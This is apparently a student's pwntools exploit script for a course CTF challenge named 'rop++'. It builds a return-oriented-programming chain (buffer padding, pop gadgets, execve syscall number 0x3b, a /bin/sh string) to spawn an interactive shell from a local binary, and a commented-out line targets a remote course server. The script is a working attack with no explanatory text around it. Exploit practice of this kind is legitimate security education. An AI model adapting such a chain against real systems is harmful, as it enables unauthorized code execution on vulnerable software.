import pwn

# pwn.context.log_level = "debug"
pwn.context.arch = "amd64"


# mov_rsi_rax = 0x449fa5 # mov qword ptr [rsi], rax ; ret

payload = pwn.flat([
    b"A" * 40,
    0x401e3f,  # pop rdi; ret
    0x7fffffffd940,  # /bin/sh
    0x409e6e,  # pop rsi; ret
    0,
    # 0x00000000004507ac,  # pop rdx; retf 4
    # 0,
    # 0x0000000000447b27,  # pop rax; ret
    # 0x3b,  # execve

    0x47ed0a,  # pop rax ; pop rdx ; pop rbx ; ret
    0x3b,  # rax (syscall number)
    0x0,  # rdx
    0x1234,  # rbx (useless)

    0x0000000000414506,  # syscall (execve)

    b"/bin/sh\x00",
])

# with open("payload", "wb") as f:
#     f.write(payload)

# p = pwn.remote("edu-ctf.zoolab.org", 10003)
p = pwn.process("/home/lemtea/Course/資訊安全實務/pwn/rop++/rop++/share/chal")

p.recvuntil(b"show me rop\n> ")
p.sendline(payload)
p.interactive()
